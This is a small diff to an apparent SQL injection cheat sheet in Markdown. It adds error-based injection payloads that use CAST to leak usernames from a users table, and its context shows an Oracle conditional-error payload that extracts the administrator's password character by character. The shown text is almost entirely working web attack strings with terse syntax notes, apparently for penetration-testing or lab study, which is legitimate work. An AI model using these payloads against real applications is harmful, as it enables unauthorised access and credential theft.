@@ -129,6 +129,9 @@ With group_concat **_--- use when there's only 1 column? and sql is only showing
 
 `'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator' and substr(password,1,1)='a') ||'`
 
+`' AND CAST((SELECT 1) AS int)--`
+`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
+
 **_Limit output of rows = rownum=1  ---same as Limit 1 for mysql_**
 **_This is syntax is for oracle - Dual is a default table_**
 
